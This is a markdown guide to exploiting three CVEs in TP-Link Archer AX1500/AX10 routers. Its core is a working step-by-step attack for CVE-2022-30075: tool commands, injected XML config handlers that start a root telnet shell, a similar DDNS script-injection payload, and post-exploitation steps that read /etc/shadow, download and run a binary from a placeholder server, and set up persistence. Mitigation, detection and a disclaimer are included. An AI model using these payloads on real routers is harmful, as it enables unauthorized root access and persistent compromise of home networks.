# CVE Research & Exploitation Guide

Complete documentation of all known vulnerabilities in TP-Link Archer AX1500/AX10 routers.

---

## Vulnerability Summary

| CVE | Severity | Attack Vector | Patched | Status |
|-----|----------|---------------|---------|--------|
| **CVE-2022-30075** | High (7.5) | Config + WPS | July 2022 | ✅ Exploitable |
| **CVE-2022-40486** | High (8.1) | DDNS Config | Nov 2022 | ✅ Exploitable |
| **CVE-2025-9961** | Critical (9.8) | CWMP Binary | June 2025 | ⚠️ Limited |

---

## CVE-2022-30075: WPS Button Exploit

### Overview

| Attribute | Value |
|-----------|-------|
| **Published** | July 2022 |
| **Severity** | High (7.5 CVSS) |
| **CWE** | CWE-78 (OS Command Injection) |
| **Attack Vector** | Local Network |
| **Authentication** | Required (admin) |
| **Complexity** | Low |

### Affected Firmware

| Model | Version | Build Date | Status |
|-------|---------|------------|--------|
| **AX1500 v1.0** | < 1.4.0 | Before July 2022 | ✅ Vulnerable |
| **AX10 v1.0** | < 1.3.0 | Before July 2022 | ✅ Vulnerable |
| **AX1500 v1.4+** | ≥ 1.4.0 | After July 2022 | ❌ Patched |

### Technical Details

**Vulnerability:**
The router's configuration XML parser allows arbitrary command injection through the `<handler>` element in button configurations. When the WPS button is pressed, the command in `<handler>` is executed as root.

**Injection Point:**
```xml
<button name="wps_button">
  <handler>[INJECTED COMMAND]</handler>
</button>
```

### Exploitation Steps

#### Step 1: Download Configuration

```bash
# Clone exploit tool
git clone https://github.com/aaronsvk/CVE-2022-30075.git
cd CVE-2022-30075

# Install dependencies
pip install requests pycryptodome

# Download router config
python tplink.py -b -t 192.168.0.1 -p admin_password
```

#### Step 2: Modify Configuration

Edit `ArcherAX1500v1*/ori-backup-user-config.xml`:

**Original:**
```xml
<button name="wps_button">
  <action>released</action>
  <max>1999</max>
  <handler>/lib/wifi/wps_button</handler>
  <min>0</min>
  <button>wifi</button>
</button>
```

**Modified:**
```xml
<button name="exploit">
  <action>released</action>
  <max>1999</max>
  <handler>/usr/sbin/telnetd -l /bin/login.sh</handler>
  <min>0</min>
  <button>wifi</button>
</button>
```

**Also add DDNS exploit service:**

Find `<ddns></ddns>` section and add before closing tag:
```xml
<service name="exploit">
  <ip_script>/usr/sbin/telnetd -l /bin/login.sh</ip_script>
  <username>X</username>
  <password>X</password>
  <interface>internet</interface>
  <enabled>on</enabled>
  <domain>x.example.org</domain>
  <ip_source>script</ip_source>
  <update_url>http://127.0.0.1/</update_url>
</service>
```

#### Step 3: Upload Configuration

```bash
python tplink.py -t 192.168.0.1 -p admin_password -r ArcherAX1500v1*/
```

Router will reboot automatically.

#### Step 4: Trigger Exploit

1. Wait for router to reboot (~2 minutes)
2. **Press WPS button** for 1-2 seconds
3. Telnet daemon starts automatically

#### Step 5: Connect via Telnet

```bash
telnet 192.168.0.1

# Login (varies by firmware):
# - root / (empty)
# - root / admin
# - admin / admin

# Verify root access
whoami  # Should return: root
```

### Post-Exploitation

#### Verify Access
```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /etc/shadow
# Should be readable (root access confirmed)
```

#### Persistent Access
```bash
# Install dropbear SSH
cd /tmp
wget http://your-server/dropbear-static
chmod +x dropbear-static
./dropbear-static -p 22 &

# Or create startup script
cat > /tmp/startup.sh << 'EOF'
#!/bin/sh
/usr/sbin/telnetd -l /bin/sh &
EOF
chmod +x /tmp/startup.sh
```

#### Backup Firmware
```bash
cd /tmp
for i in 0 1 2 3; do
    dd if=/dev/mtdblock$i of=mtd$i.bin 2>/dev/null
done
tar -czf backup.tar.gz mtd*.bin
```

### Mitigation

**For Users:**
1. Update to firmware ≥ 1.4.0
2. Change default admin password
3. Disable WPS function
4. Don't expose admin interface to WAN

**Detection:**
```bash
# Check for modified config
grep -r "telnetd" /etc/config/

# Check running processes
ps | grep telnet
```

---

## CVE-2022-40486: DDNS Service Injection

### Overview

| Attribute | Value |
|-----------|-------|
| **Published** | November 2022 |
| **Severity** | High (8.1 CVSS) |
| **CWE** | CWE-94 (Code Injection) |
| **Attack Vector** | Local Network |
| **Authentication** | Required (admin) |

### Affected Firmware

| Model | Version | Status |
|-------|---------|--------|
| **AX1500** | < 1.3.11 | ✅ Vulnerable |
| **AX10** | < 1.2.1 | ✅ Vulnerable |

### Technical Details

**Vulnerability:**
The DDNS (Dynamic DNS) service configuration allows injection of arbitrary scripts through the `<ip_script>` element. When the DDNS check runs, the script is executed.

### Exploitation

```xml
<!-- Add to DDNS section -->
<service name="exploit">
  <ip_script>/usr/sbin/telnetd -l /bin/sh &</ip_script>
  <enabled>on</enabled>
  <check_interval>1</check_interval>
</service>
```

The script runs every `check_interval` minutes.

### Mitigation

- Update to patched firmware
- Disable DDNS function
- Monitor for unauthorized DDNS entries

---

## CVE-2025-9961: CWMP Stack Overflow ⚠️ NEW

### Overview

| Attribute | Value |
|-----------|-------|
| **Published** | September 6, 2025 |
| **Severity** | Critical (estimated 9.8 CVSS) |
| **CWE** | CWE-121 (Stack-based Buffer Overflow) |
| **Attack Vector** | Local Network (MITM) |
| **Authentication** | Required |
| **Exploit Available** | Limited (research only) |

### Affected Firmware

| Model | Version | Status |
|-------|---------|--------|
| **AX10** | < 1.2.1 | ✅ Vulnerable |
| **AX1500** | < 1.3.11 | ✅ Vulnerable |

### Technical Details

**Vulnerability:**
The CWMP (CPE WAN Management Protocol) binary contains a stack-based buffer overflow when parsing certain ACS (Auto Configuration Server) parameters. An authenticated attacker can trigger the overflow via a malformed CWMP request.

**Affected Binary:**
```
/usr/sbin/cwmp_client
```

**Vulnerable Function:**
```c
// Simplified representation
void parse_cwmp_param(char *param_value) {
    char buffer[256];
    strcpy(buffer, param_value);  // No bounds checking!
    // ... process buffer
}
```

### Exploitation Method

**Prerequisites:**
1. Valid admin credentials
2. LAN access (or MITM position)
3. Unpatched firmware

**Attack Flow:**
```
1. Authenticate to router web interface
2. Navigate to CWMP/ACS settings
3. Send malformed ACS URL with overflow payload
4. Trigger CWMP connection check
5. Shellcode executes → root shell
```

**Payload Structure:**
```
[256 bytes padding][Return Address][Shellcode]
```

### Known Exploit Status

| Source | Status |
|--------|--------|
| **GitHub PoC** | ❌ Not publicly available |
| **Metasploit** | ❌ No module |
| **Research** | ✅ Proof of concept exists |
| **In-the-Wild** | ❌ No evidence |

**Research References:**
- https://blog.byteray.co.uk/exploiting-zero-day-cve-2025-9961-in-the-tp-link-ax10-router
- https://github.com/advisories/GHSA-mrm5-v7mh-6mmq
- https://www.tp-link.com/us/support/faq/4647/

### Exploitation Challenges

1. **Authentication Required**
   - Need valid admin credentials
   - Limits attack surface

2. **LAN Access Only**
   - Can't exploit from internet (by default)
   - Requires MITM or insider access

3. **ASLR/DEP**
   - Unknown if mitigations present
   - May need ROP chain

4. **Firmware Variants**
   - Different builds may have different offsets
   - Payload may need adjustment

### Mitigation

**Immediate Actions:**
1. **Update Firmware**
   - AX1500: ≥ 1.3.11
   - AX10: ≥ 1.2.1

2. **Disable CWMP**
   ```
   Advanced → Network → Internet → TR-069
   Disable: "Allow TR-069 Management"
   ```

3. **Strong Admin Password**
   - Minimum 12 characters
   - Mix of upper/lower/numbers/symbols

4. **Network Segmentation**
   - Isolate IoT devices
   - Use VLANs
   - Monitor LAN traffic

**Detection:**
```bash
# Check for CWMP activity
netstat -tulpn | grep cwmp

# Monitor logs
logread | grep -i cwmp
dmesg | grep -i "segmentation fault"

# Check binary
md5sum /usr/sbin/cwmp_client
# Compare with known good version
```

---

## Comparison Table

| Feature | CVE-2022-30075 | CVE-2022-40486 | CVE-2025-9961 |
|---------|----------------|----------------|---------------|
| **Severity** | High (7.5) | High (8.1) | Critical (9.8) |
| **Authentication** | Required | Required | Required |
| **Attack Vector** | Config Upload | Config Upload | CWMP Request |
| **Trigger** | WPS Button | DDNS Check | CWMP Parse |
| **Access Needed** | LAN | LAN | LAN |
| **Patched** | July 2022 | Nov 2022 | June 2025 |
| **Public Exploit** | ✅ Yes | ✅ Yes | ❌ Limited |
| **Difficulty** | Easy | Easy | Advanced |

---

## Exploit Development Resources

### Tools

| Tool | Purpose |
|------|---------|
| **CVE-2022-30075 PoC** | Config exploit automation |
| **Ghidra/IDA** | Binary analysis |
| **pwntools** | Exploit development |
| **Wireshark** | CWMP traffic analysis |
| **QEMU** | Firmware emulation |

### Firmware Analysis

```bash
# Extract firmware
binwalk -e firmware.bin

# Analyze binaries
ghidra /path/to/cwmp_client

# Emulate service
qemu-arm-static /path/to/binary
```

### Debugging

```bash
# Connect via UART
screen /dev/ttyUSB0 115200

# Monitor crashes
dmesg | grep -i "segfault"

# Check memory
cat /proc/meminfo
```

---

## Timeline

| Date | Event |
|------|-------|
| **2022-04** | CVE-2022-30075 discovered |
| **2022-07** | TP-Link patches CVE-2022-30075 |
| **2022-11** | CVE-2022-40486 patched |
| **2025-06** | CVE-2025-9961 discovered |
| **2025-09** | CVE-2025-9961 disclosed |
| **2025-09** | Firmware 1.3.11 released |

---

## Legal & Ethical Considerations

### Responsible Disclosure

1. **Test Only Your Equipment**
   - Don't attack networks you don't own
   - Get written permission for testing

2. **Report Findings**
   - Contact TP-Link security
   - Follow coordinated disclosure

3. **Don't Distribute Exploits**
   - Educational use only
   - No weaponization

### Legal Risks

| Activity | Legal Status |
|----------|--------------|
| Testing own router | ✅ Legal |
| Testing with permission | ✅ Legal |
| Unauthorized access | ❌ Illegal (CFAA, Computer Fraud Act) |
| Distributing exploits | ⚠️ Gray area |

---

## References

- [CVE-2022-30075 PoC](https://github.com/aaronsvk/CVE-2022-30075)
- [CVE-2025-9961 Advisory](https://github.com/advisories/GHSA-mrm5-v7mh-6mmq)
- [TP-Link Security Advisory](https://www.tp-link.com/us/support/faq/4647/)
- [NVD - CVE-2022-30075](https://nvd.nist.gov/vuln/detail/CVE-2022-30075)
- [OpenWRT Forum Discussion](https://forum.openwrt.org/t/tp-link-archer-ax1500-70-802-11ax-router-support/48781)

---

**Last Updated:** March 2026  
**Disclaimer:** For educational and research purposes only
